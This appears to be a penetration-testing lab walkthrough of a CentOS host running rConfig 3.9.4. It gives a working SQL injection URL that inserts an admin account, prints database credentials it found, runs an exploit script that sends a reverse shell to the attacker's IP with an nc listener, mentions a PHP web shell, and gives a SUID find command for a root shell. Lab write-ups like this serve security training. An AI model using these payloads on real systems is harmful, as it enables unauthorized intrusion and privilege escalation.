# 🐧 CentOS (Linux) Walkthrough

## 🌐 Initial Foothold

- Discovered the following ports open:
  - 🎯 **21** - Can't list files.
  - 🔐 **22** - Closed.
  - 🌍 **80** - Hosting CentOS rConfig.

- Identified **rConfig Version 3.9.4** via web interface.
- Used SQL Injection to create an admin user:

```
https://192.168.110.57:8081/commands.inc.php?searchOption=contains&searchField=vuln&search=search&searchColumn=command ;INSERT INTO `users` (`id`, `username`, `password`, `userid`, `userlevel`, `email`, `timestamp`, `status`) VALUES ('450', 'apple', '1f3870be274f6c49b3e31a0c6728957f', '6c97424dc92f14ae78f8cc13cd08308d', 9, 'apple@domain.com', 1346920339, 1);--
```

- Logged in with: `apple:apple`
- Navigated to:

```
https://192.168.110.57:8081/settingsBackup.php#
```

- Created a system backup and extracted it.
- Found DB creds in `config.inc.php`:

```php
define('DB_PORT', '3306');
define('DB_NAME', 'rconfig');
define('DB_USER', 'rconfig_user');
define('DB_PASSWORD', 'RconfigUltraSecurePass');
```

- Used exploit:

```bash
python3 48241.py https://192.168.110.57:8081 apple apple 192.168.45.166 80
```

- Started listener:

```bash
nc -nlvp 80
```

- Got a shell as `apache` user.
- Uploaded `shell.php` to rConfig folder for a stable shell.

## 🚀 Privilege Escalation

- Ran `linpeas.sh` for enumeration.
- Found SUID on `find`.

### 📜 Exploited with:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

---

## 🧾 Git Commands

```bash
# Move the file
mv ~/Downloads/CentOS.md ~/Downloads/walkthroughs_project_template/linux/CentOS.md

# Change to the project directory
cd ~/Downloads/walkthroughs_project_template

# Stage changes
git add .

# Commit with message
git commit -m "Added CentOS (Linux) walkthrough"

# Push to GitHub
git push
```
